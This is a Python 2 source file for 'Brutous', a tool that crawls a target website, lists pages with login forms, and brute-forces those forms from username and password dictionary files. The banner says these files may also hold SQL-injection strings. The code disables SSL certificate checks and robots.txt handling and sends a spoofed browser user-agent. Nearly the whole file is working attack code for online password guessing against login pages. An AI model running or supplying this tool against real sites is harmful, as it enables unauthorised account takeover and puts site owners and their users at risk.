#!/usr/bin/python
import os
import ssl
import time
import argparse
import mechanize
import cookielib
from urlparse import urlparse
from BeautifulSoup import BeautifulSoup as bs

#Color Defination
white = '\033[1;97m'
green = '\033[1;32m'
red = '\033[1;31m'
yellow = '\033[1;33m'
aqua = '\033[1;96m' 
end = '\033[1;m'
info = '\033[1;33m[!]\033[1;m'
que =  '\033[1;34m[?]\033[1;m'
bad = '\033[1;31m[-]\033[1;m'
good = '\033[1;32m[+]\033[1;m'
run = '\033[1;96m[*]\033[1;m'
bad = bad + red
good = good + green
info = info + yellow
run = run + aqua

#Variable Declaration
links_visited = set()
links_found = set()
link_with_login_form = set()
no_login_form_in_links = set()
link_couldnot_been_opened_by_mechanize = set()
username_variable = ''
password_variable = ''
form_type_login = False

def banner():
    print yellow + '''
    ---------------------------------------------------------------------------------------------------------------------
    |                         Brutous is a tool that provides basically two functionality                               |
    |                                                                                                                   |
    |         1. Crawling target domain - It crawls given domain and collects links it finds                            |
    |                                     a. Tells you about all links it could find                                    |
    |                                     b. Tells you if there is any link that contains login form                    |
    |                                                                                                                   |
    |         2. Login Brute force:       If a login link is passed to it with the supply of dectionaries required      |
    |                                     If starts performing a bruteforce attack on the link                          |
    |                                                                                                                   |
    |                                     It can be passed with sql injection strings to try with on the login forms    |
    |                                                                                                                   |
    |                               Author: Pyxloytous (pyxloytous@gmil.com)                                            |
    |                                             version: 0.1                                                          |
    ---------------------------------------------------------------------------------------------------------------------'''

def argumentParser():

    parser = argparse.ArgumentParser()
    subparser = parser.add_subparsers(dest='commands')  # instantiating subparsers with argument "cmd" with value commands to run functions based on a condition testing avaibility of test's value
    #group = parser.add_mutually_exclusive_group(required=True)
    #group.add_argument('--url',action='store', type=str, help='Takes url for further processing')
    #group.add_argument('--ip',action='store', type=str, help='Takes ip for further processing')
    url_collection = subparser.add_parser('crawl', help='Collecting all url in the given target recursively')
    form_login_brute = subparser.add_parser('login_brute', help='Perform sql injection of forms fields of pages having form files')

    url_collection.add_argument('-u', '--url', action='store', dest='url', required=True, help='Takes url in http://a.b.c.d | https://a.b.c.d')
    url_collection.add_argument('-c', '--crawl', action='store_true', default=False, required=True, help='Instruction for crawling the target website')

    form_login_brute.add_argument('-u', '--url', action='store', dest='url', required=True, help='Takes url if not ip provided')
    form_login_brute.add_argument('-U', '--username_file', required=True, help='Takes username file path')
    form_login_brute.add_argument('-P', '--pass_file', required=True, help='Takes password file path')
    form_login_brute.add_argument('-b', '--pass_brute', action='store_true', default=False, required=True, help='instruruction for brute forcing login page')

    args = parser.parse_args()
    return args

try:
    #Opening Browser Handler
    br = mechanize.Browser()
    br.set_handle_equiv(True) #set_handle_equiv(True)
    #br.set_handle_gzip(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    cj = cookielib.LWPCookieJar()
    br.set_cookiejar(cj)
except Exception as e:
    pass

def exception_handler_br_attrs(br, browser_attr, link):

    if browser_attr == 'links':
        if hasattr(br, browser_attr):   # br attributes forms, liks etc
            try:
                browser_attr = br.links()
                return browser_attr

            except Exception as e:
               link_couldnot_been_opened_by_mechanize.add(link)

    elif browser_attr == 'forms':
        if hasattr(br, browser_attr):
            try:
                browser_attr = br.forms()
                return browser_attr

            except Exception as e:
                no_login_form_in_links.add(link)
    else:
        print bad + "Browser attr [forms] not found in url: %s" % link
        pass






def link_opener(br, link):

    link = str(link)
    global link_couldnot_been_opened_by_mechanize
    #global link_visited

    if link not in links_visited:
        try:
            ssl_cert_verification_bypass()
            res = br.open(link)
            links_visited.add(link)
            return br
        except Exception as e:
            if link not in link_couldnot_been_opened_by_mechanize:
                link_couldnot_been_opened_by_mechanize.add(link)
            pass





def url_constructor(link, url_head):

    link = str(link)
    url_head = str(url_head)

    if 'http' not in link and 'https' not in link and 'www' not in link:
        if link[0] == '.':
            link = link.lstrip('.')
            url = url_head + '/' + link
            return url

        elif link[0] == '/':
            url = url_head + link
            return url

        elif link[0] != '.' and  link != '/':
            url = url_head + '/' + link
            return url



#File Handling
def file_opener(file_name):
    existence = False
    readable = False

    if os.path.isfile(file_name):   #os.access(file_name, os.F_OK):
        existence = True
    else:
        print bad + '[-] File_name "%s" provided does not exist. Please provide dictionary/sql injection string file' % file_name
    if existence:
        if os.access(file_name, os.R_OK):
            readable = True
        else:
            print bad + '[-] File_name "%s" exists but not readable/accessible. Please check user privilege on the file' % file_name

    if existence and readable:
        file_handle =  open(file_name, 'r+')
        return file_handle




#Desabling SSl check for mechanize   
def ssl_cert_verification_bypass():
        
    try:
        _create_unverified_https_context = ssl._create_unverified_context
    except AttributeError:
        # Legacy Python that doesn't verify HTTPS certificates by default
        pass
    else:
        # Handle target environment that doesn't support HTTPS verification
        ssl._create_default_https_context = _create_unverified_https_context    
    

#sorting login form & implementation of bruteforce
def pass_word_brute_force(br, form, url, forms_list, username_file, password_file, pass_brute=False):
    found = False
    form_control_list = []
    forms_list = forms_list # list of all forms collected during crawling for form index checking further
    for control in form.controls:
        form_control_list.append(control.type)
        if control and control.type == "text":
            username_variable = control.name
        if control and control.type == "password":
            password_variable = control.name
  
    if pass_brute:
        if 'text' in form_control_list and 'password' in form_control_list:
            print red + "[*]Starting pass_brute_force..."
            #time.sleep(10)
            index_pos = forms_list.index(form)
            #print "[+] index position of the forms in forms is: %s" % index_pos
            br.select_form(nr=index_pos)
            br.form[username_variable] = 'some_username'
            br.form[password_variable] = '12458' #"xxx%%%@@@" #Some wrrong password to get  wrong response and then compare its length with that of correctly supplied password
            comp_res = br.submit()
            comp_soup = bs(comp_res)
            file_handle_1 = file_opener(username_file) #dictiionary of normal words or sql injection strings
            file_handle_2 = file_opener(password_file) #dictiionary of normal words or sql injection strings
            if file_handle_1 and file_handle_2:
                print info + "Target login page > %s" % url
                for username in file_handle_1:
                    username = username.strip('\n')
                    for password in file_handle_2:
                        password = password.strip('\n')
                        br.select_form(nr=index_pos) #(predicate=select_form(form))                     
                        br.form[username_variable] = username
                        br.form[password_variable] = password

                        print aqua + "Trying username and password as {%s:%s}" % (username, password)
                        res = br.submit()
                        soup = bs(res)

                        if len(soup) != len(comp_soup):
                            print info + "Possible Chances for logging in encountered, difference found on length of before and after responses\n"
                            print green + 'Please check username:password -  [ %s ]:[ %s ]\n' % (username, password)
                            #print "[+]length of response1:response2 is %s:%s" % (len(comp_soup), len(soup))
                            found = True
                            return found
                        else:
                          pass

    return found

            

#Crawling over web, finding links and forms embedded
def crawler(url, br, link_head, username_file=None, password_file=None, pass_brute=False, crawl=False, brute_all=False):

    #instantiating URL
    url = url
    link_head = link_head  #head of the given url to be concatinated by link_constructuctor function to links found further

    br = link_opener(br, url)

    forms_list = []

    forms = exception_handler_br_attrs(br, 'forms', url)
    login_form = False
    if forms:
        form_bruted = []
        for form in forms:
            forms_list.append(form)
            form_control_list = []
            for control in form.controls:
                form_control_list.append(control.type)
                if 'text' in form_control_list  and 'password' in form_control_list:
                    login_form = True
                    link_with_login_form.add(url)

            if login_form and pass_brute:
                if form not in form_bruted:
                    bruted = pass_word_brute_force(br, form, url, forms_list, username_file, password_file, pass_brute=True)
                    form_bruted.append(form)
                    if bruted == False:
                        print bad  + 'User credentials could not be brute forced :('
                        return

    else:
        pass

    links = exception_handler_br_attrs(br, 'links', url) #Checks if links attribute is ther in br instance after opening given link
    if links and crawl:
        for link in links:
            link = link.url
            link = url_constructor(link, link_head)
            if link:
                links_found.add(link)

            if link != None and crawl:
                crawler(link, br, link_head, username_file=None, password_file=None, pass_brute=False, crawl=True, brute_all=False)

    return



def main():

    banner()
    #time.sleep(15)

    crawl = False
    pass_brute = False

    args = argumentParser()

    url = args.url

    link_head, tail = os.path.split(url)
    if 'username_file' in args:
        username_file = args.username_file

    if 'pass_file' in args:
        password_file = args.pass_file

    if 'crawl' in args:
        crawl = args.crawl

    if 'pass_brute' in args:
        pass_brute = args.pass_brute


    if pass_brute:
        print info + 'Running Brute Forcer ...'
        crawler(url, br, link_head, username_file=username_file, password_file=password_file, pass_brute=True, crawl=False, brute_all=False)





    if crawl:
        print info + 'Running crawler ...'
        crawler(url, br, link_head, username_file=None, password_file=None, pass_brute=False, crawl=True, brute_all=False)
        if links_found:
            print yellow +  '\n[+]links_found are:'
            for link in links_found:
                print green + link

        if link_with_login_form:
            print green + '\n[+] links found with login forms are:'
            for link in link_with_login_form:
                print yellow + link

        if link_couldnot_been_opened_by_mechanize:
            print red + '\n[-]link_couldnot_been_opened_by_mechanize:'
            for link  in link_couldnot_been_opened_by_mechanize:
                print aqua + link


    



if __name__ == '__main__':
   main()




